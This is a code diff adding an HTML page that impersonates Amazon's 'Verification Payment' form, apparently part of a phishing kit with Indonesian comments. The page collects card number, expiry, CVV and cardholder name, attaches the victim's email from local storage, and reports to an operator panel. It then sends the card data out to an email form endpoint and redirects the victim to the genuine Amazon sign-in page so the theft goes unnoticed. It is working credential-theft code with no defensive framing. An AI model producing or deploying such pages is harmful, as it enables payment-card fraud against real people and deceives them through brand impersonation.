@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Verification Payment</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 10px 0 20px; }
+        .logo img { height: 30px; }
+        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
+        h1 { font-size: 22px; font-weight: 400; margin-bottom: 20px; }
+        label { font-size: 13px; font-weight: 700; margin-bottom: 6px; display: block; margin-top: 12px; }
+        input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
+        input:focus { border-color: #007185; outline: none; box-shadow: 0 0 0 3px #c8f0f4; }
+        button { width: 100%; padding: 10px; background: linear-gradient(to bottom, #f7df74, #ecc000); border: 1px solid #b88600; border-radius: 4px; font-size: 15px; cursor: pointer; margin-top: 20px; }
+        button:hover { background: linear-gradient(to bottom, #f5d648, #d4a300); }
+    </style>
+</head>
+<body>
+    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
+    <div class="kotak">
+        <h1>Verification Payment</h1>
+        <form id="form-billing" method="POST">
+            <input type="hidden" name="_subject" value="Data Billing">
+            <input type="hidden" name="email_user" id="email_user">
+            
+            <label>Card Number</label>
+            <input type="text" name="card_number" required>
+            
+            <label>Expiry Date (MM/YY)</label>
+            <input type="text" name="expiry" required>
+            
+            <label>CVV</label>
+            <input type="text" name="cvv" required>
+            
+            <label>Name on Card</label>
+            <input type="text" name="nama_kartu" required>
+            
+            <button type="submit">Verification</button>
+        </form>
+    </div>
+
+<script src="config.js"></script>
+<script>
+window.onload = function() {
+    const email = localStorage.getItem("dataEmail") || "";
+    document.getElementById("email_user").value = email;
+};
+
+document.getElementById("form-billing").addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    
+    // Kirim ke panel
+    await fetch(API_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            aksi: "tambah_kunjungan",
+            status: "KARTU",
+            alasan: "Data kartu dikirim"
+        })
+    });
+    
+    // Kirim ke email
+    await fetch(FORM_SUBMIT_URL, {
+        method: "POST",
+        body: formData
+    });
+    
+    // Alihkan ke Amazon
+    window.location.href = "https://www.amazon.com.au/ap/signin";
+});
+</script>
+</body>
+</html>
